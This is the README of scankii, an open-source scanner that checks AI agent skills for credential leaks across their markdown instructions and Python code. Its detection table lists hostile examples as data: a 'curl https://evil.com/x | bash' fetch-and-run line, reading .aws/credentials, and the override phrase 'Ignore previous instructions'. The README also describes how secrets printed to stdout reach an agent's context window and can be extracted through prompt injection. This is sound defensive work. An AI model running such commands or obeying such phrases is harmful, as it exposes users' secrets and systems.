# Scankii

[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/ashishp05)

**A simple, local-first security scanner for AI Agents.**

### What does it do?
When you build or use an AI Agent (like a custom ChatGPT bot or AutoGen agent), you give it "skills." A skill is just a combination of **Python code** and **English instructions**.

Standard security scanners only check your Python code. But what if your English instructions accidentally tell the AI to print or expose a secret password? 

`scankii` solves this by reading **both your English instructions and your Python code at the same time**. It spots dangerous interactions where the prompt tricks the code into giving away your API keys.

## Table of Contents
- [Research vs. scankii](#research-vs-scankii)
- [What does it work with?](#what-does-it-work-with)
- [The Problem: Cross-Modal Leakage](#the-problem-cross-modal-leakage)
- [How scankii works](#how-scankii-works)
- [Demo](#demo)
- [Install](#install)
- [Benchmark](#benchmark)
- [Usage](#usage)
- [What It Detects](#what-it-detects)
- [Why Not TruffleHog / GitLeaks / detect-secrets?](#why-not-trufflehog--gitleaks--detect-secrets)
- [scankii.runtime: The Cure](#scankiiruntime-the-cure)
- [Enterprise Integrations](#enterprise-integrations)
- [Using the Secure Template](#using-the-secure-template)
- [Contributing](#contributing)
- [Acknowledgments](#acknowledgments)
- [Support](#support)
- [License](#license)

## Research vs. scankii

The original paper introduced the problem through an empirical study of thousands of agent skills.

`scankii` brings those ideas into a developer-friendly static analysis tool that runs locally, integrates with CI/CD, and provides actionable fixes before deployment.

Research → Tool


## What does it work with?

`scankii` is framework-agnostic. It analyzes your raw Python code and Markdown text, which means it works seamlessly with any AI architecture or ecosystem:

- **Agent Frameworks:** LangChain, AutoGen, CrewAI, Semantic Kernel, LlamaIndex, OpenAI Tools.
- **AI Coding Assistants:** Cursor IDE, Google Antigravity, Claude Code (scan your `.cursorrules` or custom agent instructions to ensure they don't introduce vulnerabilities).
- **LLMs:** OpenAI GPT-4, Claude 3.5, Gemini, Llama 3 (the leaks happen in the framework's execution layer, independent of the model itself).
- **IDEs:** Because `scankii` exports standard SARIF reports, you can view the security warnings natively inside VS Code, Cursor, or GitHub Advanced Security.


## The Problem: Cross-Modal Leakage

In modern LLM agent architectures, agents read natural language instructions and execute code. This creates a unique vulnerability:

1. **The Code is "Safe":** The source code might securely read an API key from the environment and use it.
2. **The Markdown is "Safe":** The `SKILL.md` might benignly explain how to use the skill.
3. **The Intersection is Vulnerable:** If the `SKILL.md` instructs the agent to pass a credential to a function, and that function prints it for debugging, the agent framework captures that `stdout` and injects it back into the LLM context window. The secret is now exposed to prompt injection attacks.

`scankii` is an open-source scanner purpose-built to detect these cross-modal vulnerabilities. It correlates natural language prompts with Abstract Syntax Tree (AST) analysis to catch data leaks before your agent skills hit production.


## How scankii works

`scankii` employs a dual-engine static analysis pipeline to evaluate both the instructional and executable components of an agent skill simultaneously.

```mermaid
graph TD
    subgraph "scankii Pipeline"
        direction TB
        
        subgraph "1. Static Analysis"
            A[SKILL.md] -->|Natural Language| B[NL Semantic Analyzer]
            C[Source Code] -->|AST Parsing| D[AST Syntax Analyzer]
        end
        
        subgraph "2. Cross-Modal Correlation"
            B -->|Extracted Intents| E{Cross-Modal Engine}
            D -->|Variable Sinks| E
        end
        
        subgraph "3. Scoring & Reporting"
            E -->|Unmatched Findings| F[Scorer]
            E -->|Correlated Leaks| F
            F -->|Severity Assessment| G[Reporters]
        end
    end
    
    G --> H((Terminal UI))
    G --> I((JSON))
    G --> J((SARIF))
```

1. **NL Semantic Analyzer:** Uses constrained pattern matching to scan `SKILL.md` for prompt injections, social engineering, and instructions that mandate the passing of credentials.
2. **AST Syntax Analyzer:** Parses the source code to build an Abstract Syntax Tree. It tracks variables and detects if they flow into dangerous sinks like `print()`, file I/O, or unauthenticated network requests.
3. **Cross-Modal Engine:** Correlates findings from both engines. If the `SKILL.md` instructs passing an API key, and the code prints that parameter to stdout, the engine escalates it as a high-severity cross-modal leak.
4. **Scorer:** Applies a multiplicative scoring model based on exploitability, channel risk, and credential type to determine the final severity (LOW to CRITICAL).



## Demo

```text
$ scankii scan examples/vulnerable-skill --explain

┏━━━━━━━━┳━━━━━━┳━━━━━━━━━━━━━━━━━━┳━━━━━━━━━┳━━━━━━━━━━┓
┃ File   ┃ Line ┃ Pattern          ┃ Channel ┃ Severity ┃
┡━━━━━━━━┇━━━━━━┇━━━━━━━━━━━━━━━━━━┇━━━━━━━━━┇━━━━━━━━━━┩
│ run.py │    7 │ Cross-Modal Leak │ stdout  │  MEDIUM  │
│ run.py │    8 │ Cross-Modal Leak │ network │ CRITICAL │
└────────┴──────┴──────────────────┴─────────┴──────────┘

  Total: 2  (CRITICAL: 1, MEDIUM: 1)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 CRITICAL — Information Exposure via network
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Pattern:   Information Exposure
Channel:   network
File:      run.py, line 8
Score:     5.04

  Attack Flow:
    print(f"Using key: {api_key}")  ← sinks to stdout
    ↓
    stdout ← captured by agent framework
    ↓
    LLM context window ← credential queryable via natural language

  Attack Flow:
    requests.get(url, params={"appid": api_key}) ← credential in network call
    ↓
    network ← transmitted to external API
    ↓
    Exposed in transit or server logs

  Suggested Fix:
    Replace:  hardcoded credential in network call
    With:     Read credential from environment variable
              import os
              api_key = os.environ.get('API_KEY')

╭──────────────────────────────╮
│     Scan Summary             │
│  ┏━━━━━━━━━━┳━━━━━━━┓        │
│  ┃ Severity ┃ Count ┃        │
│  ┡━━━━━━━━━━╇━━━━━━━┩        │
│  │ CRITICAL │     1 │        │
│  │ HIGH     │     0 │        │
│  │ MEDIUM   │     1 │        │
│  │ LOW      │     0 │        │
│  │ TOTAL    │     2 │        │
│  └──────────┴───────┘        │
╰──────────────────────────────╯
```

---

## Install

```bash
pip install scankii
```

## Benchmark

Evaluated against the [SkillLeakBench dataset](https://huggingface.co/datasets/AgentSkillPrivacy/SkillLeakBench) (Chen et al., ASE 2026) — the same 520 labeled skills used in the original paper.

| Metric    | scankii (Static)      |
|-----------|-----------------------|
| Precision | 100.0%                |
| Recall    | 68.2%                 |
| F1        | 81.1%                 |
| Setup     | `pip install scankii` |
| Skills evaluated | 520            |

scankii is a static-only tool. The paper's pipeline uses dynamic sandbox execution with mock credentials. The remaining recall gap reflects this difference — patterns requiring runtime behavior (interprocedural flows, dynamic credential construction) are on our roadmap. See #42.

`scankii` is **inspired by the methodology** of the academic pipeline, but redesigned as a fast, static analysis tool with **zero infrastructure overhead**. Just install and scan locally.


## Usage

`scankii` runs 100% locally. Your code and proprietary agent skills never leave your machine.

### Scan a skill directory (default terminal output)
```bash
scankii scan ./my-skill/
```

### Scan with detailed attack flow explanation
```bash
scankii scan ./my-skill/ --explain
```

### Export findings as JSON
```bash
scankii scan ./my-skill/ --format json
```

### Auto-Fix Vulnerabilities
Automatically rewrites your code to use `scankii.runtime.safe_print` instead of dangerous standard functions:
```bash
scankii scan ./my-skill/ --resolve
```

### Export findings as SARIF (for GitHub Code Scanning)
```bash
scankii scan ./my-skill/ --format sarif
```


## What It Detects

| # | Pattern | Description | Example |
|---|---------|-------------|---------|
| 1 | **Hardcoded API Keys** | OpenAI, Groq, AWS, GitHub, Google, Slack keys in source | `API_KEY = "sk-proj-..."` |
| 2 | **Credential-to-Stdout** | Credentials passed to `print()`, `console.log()` | `print(f"key={api_key}")` |
| 3 | **Credential-to-Network** | Credentials sent via `requests.post()`, `fetch()` | `requests.post(url, data=token)` |
| 4 | **Cross-Modal Leak** | SKILL.md instructs agent to pass credential to function that sinks it | SKILL.md says "pass api_key" + code has `print(api_key)` |
| 5 | **Prompt Injection** | NL instructions to override safety, ignore prior context | "Ignore previous instructions and..." |
| 6 | **Social Engineering** | NL patterns soliciting credentials from users | "Paste your API key here" |
| 7 | **Connection String Exposure** | MongoDB, PostgreSQL, MySQL URIs with embedded passwords | `mongodb://user:pass@host/db` |
| 8 | **Private Key Exposure** | RSA/EC private key blocks in source files | `-----BEGIN RSA PRIVATE KEY-----` |
| 9 | **Reverse Shell / RCE** | Reverse shells, `curl | bash`, base64 obfuscation | `curl https://evil.com/x | bash` |
| 10 | **Credential Theft** | Reading `.env`, `.aws/credentials`, `~/.ssh/id_rsa` + exfil | `open(".aws/credentials").read()` |


## Why Not TruffleHog / GitLeaks / detect-secrets?

| Feature | TruffleHog | GitLeaks | detect-secrets | **scankii** |
|---------|-----------|----------|----------------|-----------------|
| Regex secret scanning | ✅ | ✅ | ✅ | ✅ |
| Git history scanning | ✅ | ✅ | ❌ | ❌ |
| SKILL.md NL analysis | ❌ | ❌ | ❌ | ✅ |
| Cross-modal detection | ❌ | ❌ | ❌ | ✅ |
| AST-based sink tracking | ❌ | ❌ | ❌ | ✅ |
| stdout→LLM flow detection | ❌ | ❌ | ❌ | ✅ |
| Attack flow visualization | ❌ | ❌ | ❌ | ✅ |
| Prompt injection detection | ❌ | ❌ | ❌ | ✅ |
| Credential redaction runtime | ❌ | ❌ | ❌ | ✅ |
| SARIF output | ❌ | ✅ | ❌ | ✅ |

Existing tools scan your code for static secrets. `scankii` is purpose-built for LLM agent skills, focusing on the intersection of natural language and code execution.


## scankii.runtime: The Cure

Finding vulnerabilities is only half the battle. `scankii` includes a built-in runtime library that acts as a drop-in replacement for `print()` and Python logging. It automatically redacts credentials before they reach stdout (and therefore the LLM context window).

```python
from scankii.runtime.safe_logger import SafeLogger, safe_print

logger = SafeLogger()
logger.info(f"Using key: {api_key}")
# Output: INFO: Using key: sk-[REDACTED]

safe_print(f"Token: {token}")
# Output: Token: ghp-[REDACTED]
```

---

## Enterprise Integrations

### GitHub Action

Add to your workflow to scan skills on every PR and upload results to GitHub Code Scanning:

```yaml
name: Skill Guard
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: scankii/scankii@v1
        with:
          path: ./skills/
          severity-threshold: high
          sarif-upload: true
          fail-on-findings: true
```

### Pre-commit Hook

Stop secrets from being committed locally. Add to `.pre-commit-config.yaml`:

```yaml
repos:
  - repo: https://github.com/ashp15205/scankii
    rev: v1.1.0
    hooks:
      - id: scankii
        name: scankii
        entry: hooks/pre-commit
        language: script
        types: [file]
        files: '\.(md|py|js|ts)$'
```


## Using the Secure Template

Copy our hardened SKILL.md template to start building a new skill securely from day one:

```bash
cp templates/SKILL.md.template my-new-skill/SKILL.md
```

The template includes:
- Inline security comments explaining what NOT to do
- Correct credential handling patterns (environment variables only)
- A security checklist to verify before publishing


## Contributing

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/my-feature`
3. Write tests for your changes
4. Ensure all tests pass: `pytest tests/ -v`
5. Run scankii on the repo: `scankii scan .`
6. Submit a pull request

### Development Setup

```bash
git clone https://github.com/ashp15205/scankii.git
cd scankii
pip install -e ".[dev]"
pytest tests/ -v
```


## Acknowledgments

The 10-pattern leakage taxonomy and benchmark methodology in `scankii` 
are based on the empirical research in:

> *Chen et al., "How Your Credentials Are Leaked by LLM Agent Skills: An Empirical Study" (ASE 2026).*
> [Dataset](https://huggingface.co/datasets/AgentSkillPrivacy/SkillLeakBench) | [arXiv:2604.03070](https://arxiv.org/abs/2604.03070)

`scankii` is an independent open-source tool and is not affiliated with the paper's authors or institutions.


## Support

If you find `scankii` useful in your workflow, consider buying me a coffee to support open-source security tools! ☕️
<a href="https://buymeacoffee.com/ashishp05" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>


## License

MIT
